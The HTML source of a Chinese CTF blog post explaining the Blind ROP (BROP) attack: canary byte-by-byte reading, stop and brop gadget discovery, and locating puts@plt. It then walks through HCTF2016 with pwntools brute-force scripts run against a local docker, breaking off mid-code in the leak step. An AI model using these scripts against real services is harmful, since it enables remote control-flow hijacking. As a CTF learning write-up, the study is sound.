@@ -1,0 +1,1228 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="R4bb1t的ctf博客" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="由于初学也是因为太笨的原因一直没有彻底学习一下brop，今天因为某些原因必须做一道 brop 把自己逼出来了 写在前面BROP攻击基于一篇发表在Oakland 2014的论文Hacking Blind，作者是Standford的Andrea Bittau，以下是相关的paper和slide链接： paper slide 以及BROP的原网站地址">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bline rop填坑">
+<meta property="og:url" content="http://yoursite.com/2020/06/21/brop填坑/index.html">
+<meta property="og:site_name" content="R4bb1t的ctf博客">
+<meta property="og:description" content="由于初学也是因为太笨的原因一直没有彻底学习一下brop，今天因为某些原因必须做一道 brop 把自己逼出来了 写在前面BROP攻击基于一篇发表在Oakland 2014的论文Hacking Blind，作者是Standford的Andrea Bittau，以下是相关的paper和slide链接： paper slide 以及BROP的原网站地址">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/images/brop填坑/1.jpg">
+<meta property="og:image" content="http://yoursite.com/images/brop填坑/2.jpg">
+<meta property="og:image" content="http://yoursite.com/images/brop填坑/3.jpg">
+<meta property="og:image" content="http://yoursite.com/images/brop填坑/4.jpg">
+<meta property="og:image" content="http://yoursite.com/images/brop填坑/5.jpg">
+<meta property="og:image" content="http://yoursite.com/images/brop填坑/6.jpg">
+<meta property="og:updated_time" content="2020-03-27T08:23:10.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Bline rop填坑">
+<meta name="twitter:description" content="由于初学也是因为太笨的原因一直没有彻底学习一下brop，今天因为某些原因必须做一道 brop 把自己逼出来了 写在前面BROP攻击基于一篇发表在Oakland 2014的论文Hacking Blind，作者是Standford的Andrea Bittau，以下是相关的paper和slide链接： paper slide 以及BROP的原网站地址">
+<meta name="twitter:image" content="http://yoursite.com/images/brop填坑/1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/06/21/brop填坑/">
+
+
+
+
+
+  <title>Bline rop填坑 | R4bb1t的ctf博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">R4bb1t的ctf博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/brop填坑/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="R4bb1t">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/n0va.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R4bb1t的ctf博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Bline rop填坑</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-21T15:11:22+08:00">
+                2020-06-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>由于初学也是因为太笨的原因一直没有彻底学习一下brop，今天因为某些原因必须做一道 brop 把自己逼出来了</p>
+<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>BROP攻击基于一篇发表在Oakland 2014的论文Hacking Blind，作者是Standford的Andrea Bittau，以下是相关的paper和slide链接：</p>
+<p><a href="http://www.scs.stanford.edu/brop/bittau-brop.pdf" target="_blank" rel="noopener">paper</a></p>
+<p><a href="http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf" target="_blank" rel="noopener">slide</a></p>
+<p>以及BROP的原网站<a href="http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf" target="_blank" rel="noopener">地址</a></p>
+<a id="more"></a>
+<h2 id="BROP攻击的目标和前提条件"><a href="#BROP攻击的目标和前提条件" class="headerlink" title="BROP攻击的目标和前提条件"></a>BROP攻击的目标和前提条件</h2><p>目标：通过ROP的方法远程攻击某个应用程序 ，劫持该应用程序的控制流。我们可以不需要知道该应用程序的源代码或者任何二进制代码，该应用程序可以被现有的一些保护机制如NX , ASLR , PIE , stack canaries等保护，应用程序所在的服务器可以是32位系统也可以是64位系统 。</p>
+<p>而这个攻击实现的两个前提条件是：</p>
+<p>1、必须先存在一个已知的stack overflow的漏洞，而且攻击者知道如何触发这个漏洞；</p>
+<p>2、服务器进程在crash之后会重新复活，并且复活的进程不会被re-rand(意味着虽然有ASLR保护，但是复活的程序和之前 的进程的地址随机化是一样的)。这个需求其实是合理的，因为当前像nginx , MySQL , Apache , OpenSSH , Samba等服务器应用都是符合这种特性的。</p>
+<h2 id="BROP的攻击流程"><a href="#BROP的攻击流程" class="headerlink" title="BROP的攻击流程"></a>BROP的攻击流程</h2><h3 id="远程dump内存"><a href="#远程dump内存" class="headerlink" title="远程dump内存"></a>远程dump内存</h3><p>由于我们不知道被攻击程序的内存布局，所以首先要做的就是通过某种方式从远程服务器dump出程序的内存到本地，为了做到这点我们需要调用一个系统调用write或puts等的打印函数，但是ROP攻击的角度来看，我们需要的<code>pop rdi`</code>pop rsi`等的gadgets地址并不知道，特别是当系统 部署了canary 就更难了。</p>
+<p>所以我们先把这个问题放一放，先记着这个目标，先解决路上的障碍</p>
+<h3 id="攻破Stack-Canaries保护"><a href="#攻破Stack-Canaries保护" class="headerlink" title="攻破Stack Canaries保护"></a>攻破Stack Canaries保护</h3><p>作者提出了一种叫做”stack reading”的方法：</p>
+<p>假设这是我们要overflow的栈布局：</p>
+<p><img src="\images\brop填坑\1.jpg" alt></p>
+<p>首先我们可以尝试任意多次判断overflow的长度（直到canary被破坏crash了）之后我们将buffer填上任意值，然后一个一个字节顺序地进行尝试来还原出真实的canary，（因为程序重启canary不变），由于一个字节只有256种可能，所以我们最多尝试256次就可以找到canary 的某个正确的字节，直到进8个字节的canary 都完整得找到</p>
+<h3 id="寻找stop-gadget"><a href="#寻找stop-gadget" class="headerlink" title="寻找stop gadget"></a>寻找stop gadget</h3><p>到目前为止，我们已经找到了合适的canary绕过stack canary 的保护，接下来我们需要寻找一个特殊的gadgets：stop gadget。</p>
+<p>一般情况下，如果我们把栈上的<code>return address</code>覆盖成某些我们随意选取的地址的话，程序 很大程度会crash掉，从而使得攻击者的连接(connection)被关闭，但是存在另外一种情况，即该<code>return address</code>指向了一块代码区域，当程序的执行流跳到那里之后，程序不会crash，而是进入了无限循环，（比如回到main函数，回到start函数）攻击者能一直保持连接状态。这样的地址我们称之为<code>stop gadget</code>，这种gadget对于寻找其它的gadgets取到了至关重要的作用</p>
+<h3 id="寻找brop-gadget"><a href="#寻找brop-gadget" class="headerlink" title="寻找brop_gadget"></a>寻找brop_gadget</h3><p>当有了<code>stop gadget</code>，我们就可以继续寻找其它有用的gadget（useful gadget)（比如pop rdi这些）</p>
+<p>在没有<code>stop gadget</code>之前 我们是无法确定<code>useful gadget</code>的；假设我们猜到一个useful gadget如<code>pop rdi ;ret</code>，但是由于执行完这个<code>gadget</code>后进程还是会跳到下一个地址，如果该地址是一个非法地址，那么进程到最后还是会carch，在这个过程中攻击者其实不知道这个userful gadget已经执行过了，他看到的结果是程序crash了，从而不认为这是个userful gadget而放弃它</p>
+<p><img src="\images\brop填坑\2.jpg" alt></p>
+<p>但是如果我们有了stop gadget，那就不一样了，如果我们在需要尝试的gadgets 后面填上了足够多的<code>stop gadget</code>，如图</p>
+<p><img src="\images\brop填坑\3.jpg" alt></p>
+<p>这样，如果尝试的gadget 是<code>useful gadget</code>的话程序 就不会crash。</p>
+<p><code>brop gadget</code>：在<code>libc_csu_init</code>的结尾有一长串的 gadget ，我们可以通过偏移来获取 <code>pop rdi;ret</code>和<code>pop rsi ; pop r15 ; ret</code>这两个gadget，如图：</p>
+<p><img src="\images\brop填坑\4.jpg" alt></p>
+<p>用上面提到的找 <code>useful gatget</code>的方法就很容易找到这个<code>brop gadget</code>了</p>
+<p><img src="\images\brop填坑\5.jpg" alt></p>
+<h3 id="寻找plt项"><a href="#寻找plt项" class="headerlink" title="寻找plt项"></a>寻找plt项</h3><p>程序的plt表具有比较规整的结构 ，第一个plt表项都是16字节。而且，在每一个表项的6字节偏移处，是该表项对应的韩寒苏解析路径，即程序最初执行该函数的时候，会执行该路径对函数的got 地址进行解析。</p>
+<p><img src="\images\brop填坑\6.jpg" alt></p>
+<p>另外 ，对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以，如果我们发现了一系列的长度为16的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了 plt 表。</p>
+<h3 id="控制-RDX"><a href="#控制-RDX" class="headerlink" title="控制 RDX"></a>控制 RDX</h3><p>对于没有puts函数的程序来说，一般用来dump 的函数是write，于是就有一个问题，write需要3个参数，也就是说rdx也需要控制 ，但是一般程序中是不存在<code>pop rdx;ret</code>这样的gadget的；所以作者提出，相比于寻找<code>pop rdx</code>指令，他认为可以利用strcmp这个函数调用，该函数调用会把字符串的长度赋值给<code>rdx</code>，从而达到相同的效果。需要提醒的是，并不是所有程序都会调用strcmp函数，当程序中没有strcmp 函数的情况下，我们就得利用其它的方式来控制 rdx 了</p>
+<p>那么，我们如何确定 strcmp 函数的plt地址呢？</p>
+<p>对于strcmp 来说，作者提出的方法是对其传入不同的参数组合，通过该方法调用返回的结果来进行判断 ，因为<code>brop gadget</code>的存在，所以我们可以很方便地控制前两个参数，strcmp 会发生如下可能的情况：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">strcmp(bad,bad)</span><br><span class="line">strcmp(bad,readable)</span><br><span class="line">strcmp(readable,bad)</span><br><span class="line">strcmp(readable,readable)</span><br></pre></td></tr></table></figure>
+<p>只有最后一种格式，程序才会正常执行；</p>
+<blockquote>
+<p>注：在没有 PIE 保护的时候，64位程序 的ELF文件的0x400000处有7个非零字节</p>
+</blockquote>
+<p>那么我们该如何具体去做呢？一种比较直接的方法就是从头到尾依次扫描每个 plt 表项，但是这个比较麻烦，我们可以选择如下的一种方法</p>
+<ul>
+<li>利用 plt 表项的慢路径</li>
+<li>并且利用下一个表项的慢路径的地址来覆盖返回地址</li>
+</ul>
+<p>这样，我们就不用来回控制 相应的变量了。</p>
+<p>当然我们也可能碰巧到到 strncmp 或 strcasecmp 函数，它们和 strcmp 函数具有一样的效果</p>
+<h3 id="寻找输出函数"><a href="#寻找输出函数" class="headerlink" title="寻找输出函数"></a>寻找输出函数</h3><h4 id="寻找put-plt"><a href="#寻找put-plt" class="headerlink" title="寻找put@plt"></a>寻找put@plt</h4><p>我们已经可以控制 rdi 了，在没有开启 PIE 的情况下，0x400000 处为ELF文件的头部，其内容为<code>\x7fELF</code>，所以我们可以通过打印 0x400000来判断是否为<code>put@plt</code></p>
+<h4 id="寻找write-plt"><a href="#寻找write-plt" class="headerlink" title="寻找write@plt"></a>寻找write@plt</h4><p>这个，如果可能调用wite(1,buf,len)的话就跟上面找puts一样，但是对于寻找或者怎么执行<code>write(socket,buf,len)</code>，菜鸡还是没搞懂，这里就涉及到寻找文件描述符的事情 ，先挖个坑，有机会来填。。。。。</p>
+<h3 id="回到最初的目的——dump-文件"><a href="#回到最初的目的——dump-文件" class="headerlink" title="回到最初的目的——dump 文件"></a>回到最初的目的——dump 文件</h3><p>其实不用dump整个文件，我们可以选择dump程序的前一部分，一般<code>0x400000~0x4001000</code>就够，因为这部分包含了plt表，在plt表中我们就可以得到got表地址，之后再打印got表拿到真实地址后就可以实施攻击了。</p>
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>还是需要具体的题目来练练手才靠谱</p>
+<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/brop/hctf2016-brop" target="_blank" rel="noopener">HCTF2016出题人失踪了</a>，我们可以本地把docker搭起来模拟远程</p>
+<h3 id="1、确定栈溢出长度"><a href="#1、确定栈溢出长度" class="headerlink" title="1、确定栈溢出长度"></a>1、确定栈溢出长度</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step 1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_overflow_len</span><span class="params">()</span>:</span></span><br><span class="line">	i = <span class="number">1</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			p = remote(<span class="string">"127.0.0.1"</span>,<span class="string">"7777"</span>)</span><br><span class="line">			p.sendafter(<span class="string">"password?\n"</span>,i*<span class="string">'a'</span>)</span><br><span class="line">			output = p.recv()</span><br><span class="line">			p.close()</span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> <span class="string">"password"</span> <span class="keyword">in</span> output:</span><br><span class="line">				<span class="keyword">return</span> i<span class="number">-1</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				i += <span class="number">1</span></span><br><span class="line">		<span class="keyword">except</span> EOFError:</span><br><span class="line">			p.close()</span><br><span class="line">			<span class="keyword">return</span> i<span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print get_overflow_len() #72</span></span><br></pre></td></tr></table></figure>
+<p>通过上面的函数我们可以确定，栈溢出的长度为72，并且通过回显的信息可以发现程序并没有开启canary，所以直接开始寻找stop gadget</p>
+<h3 id="2、寻找gadget"><a href="#2、寻找gadget" class="headerlink" title="2、寻找gadget"></a>2、寻找gadget</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step 2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stop_addr</span><span class="params">(lenth)</span>:</span></span><br><span class="line">	addr = <span class="number">0x400000</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			p = remote(<span class="string">"127.0.0.1"</span>,<span class="string">"7777"</span>)</span><br><span class="line">			p.sendafter(<span class="string">"password?\n"</span>,<span class="string">"a"</span>*lenth + p64(addr))</span><br><span class="line">			p.recv()</span><br><span class="line">			p.close()</span><br><span class="line">			log.success(<span class="string">"one success addr %s"</span>,hex(addr))</span><br><span class="line">			<span class="keyword">return</span> addr</span><br><span class="line">		<span class="keyword">except</span> EOFError:</span><br><span class="line">			addr += <span class="number">1</span></span><br><span class="line">			p.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># print get_stop_addr(72) #0x4006b6</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br></pre></td></tr></table></figure>
+<p>这里我们直接尝试64位程序没有开PIE的情况，结果发现了不少地址，我们选取一个貌似返回于是源程序 中的地址</p>
+<p><code>one success addr 0x4006b6</code></p>
+<h3 id="3、寻找brop-gadget"><a href="#3、寻找brop-gadget" class="headerlink" title="3、寻找brop_gadget"></a>3、寻找brop_gadget</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step 3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_brop_gadget</span><span class="params">(lenth,stop_gadget,addr)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p = remote(<span class="string">"127.0.0.1"</span>,<span class="string">"7777"</span>)</span><br><span class="line">		pay = <span class="string">'a'</span>*lenth + p64(addr) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(stop_gadget) + p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">		p.sendafter(<span class="string">"password?\n"</span>,pay)</span><br><span class="line">		data = p.recv()</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">print</span> data</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> <span class="string">"WelCome"</span> <span class="keyword">in</span> data:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">except</span> EOFError:</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_brop_gadget</span><span class="params">(lenth,addr)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p = remote(<span class="string">"127.0.0.1"</span>,<span class="string">"7777"</span>)</span><br><span class="line">		pay = <span class="string">'a'</span>*lenth + p64(addr) + <span class="string">'a'</span>*<span class="number">8</span>*<span class="number">10</span></span><br><span class="line">		p.sendafter(<span class="string">"password?\n"</span>,pay)</span><br><span class="line">		data = p.recv()</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"data:"</span> + data</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">	<span class="keyword">except</span> EOFError:</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lenth = <span class="number">72</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line">addr = <span class="number">0x400740</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">print</span> hex(addr)</span><br><span class="line">	<span class="keyword">if</span> get_brop_gadget(lenth,stop_gadget,addr):</span><br><span class="line">		log.info(<span class="string">"possible brop gadget %s"</span>,hex(addr))</span><br><span class="line">		<span class="keyword">if</span> check_brop_gadget(lenth,addr):</span><br><span class="line">			log.success(<span class="string">"success brop gadget %s"</span>,hex(addr))</span><br><span class="line">			pause()</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">pop_rdi = brop_gadget + <span class="number">9</span></span><br></pre></td></tr></table></figure>
+<p><code>get_brop_gadget</code>得到可能的<code>brop_gadget</code>，<code>check_brop_gadget</code>用来检查这个<code>brop_gadget</code></p>
+<h3 id="4、确定puts-plt地址"><a href="#4、确定puts-plt地址" class="headerlink" title="4、确定puts@plt地址"></a>4、确定puts@plt地址</h3><p>根据得到的brop_gadget我们构造如下payload 来获取puts@plt</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay = <span class="string">'a'</span>*lenth + p64(pop_rdi) + p64(<span class="number">0x400000</span>) + p64(addr) + p64(stop_gadget)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step 4</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_addr</span><span class="params">(lenth)</span>:</span></span><br><span class="line">	addr = <span class="number">0x400000</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">print</span> hex(addr)</span><br><span class="line">		p = remote(<span class="string">"127.0.0.1"</span>,<span class="string">"7777"</span>)</span><br><span class="line">		pay = <span class="string">'a'</span>*lenth + p64(pop_rdi) + p64(<span class="number">0x400000</span>) + p64(addr) + p64(stop_gadget)</span><br><span class="line">		p.sendafter(<span class="string">"password?\n"</span>,pay)</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			data = p.recv()</span><br><span class="line">			<span class="keyword">if</span> data.startswith(<span class="string">'\x7fELF'</span>):</span><br><span class="line">				log.success(<span class="string">"find puts@plt %s"</span>,hex(addr))</span><br><span class="line">				<span class="keyword">return</span> addr</span><br><span class="line">			p.close()</span><br><span class="line">			addr += <span class="number">1</span></span><br><span class="line">		<span class="keyword">except</span> EOFError:</span><br><span class="line">			p.close()</span><br><span class="line">			addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print get_puts_addr(72) #0x400555</span></span><br><span class="line">puts_plt = <span class="number">0x400555</span></span><br></pre></td></tr></table></figure>
+<p>得到地址<code>0x400555</code>，可以根据plt的结构进行调整得到地址<code>0x400560</code>，但是直接用也没关系</p>
+<h3 id="5、dump文件"><a href="#5、dump文件" class="headerlink" title="5、dump文件"></a>5、dump文件</h3><p>有puts函数后我们就可以dump出一部分的文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step 5</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(lenth,pop_rdi,puts_plt,leak_addr,stop_gadget)</span>:</span></span><br><span class="line">	p = remote(<span class="string">"127.0.0.1"</span>,<span class="string">"7777"</span>)</span><br><span class="line">	pay = <span class="string">'a'</span>*lenth + p64(pop_rdi) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)</span><br><span class="line">	p.sendafter(<span class="string">"password?\n"</span>,pay)</span><br><span class="line">	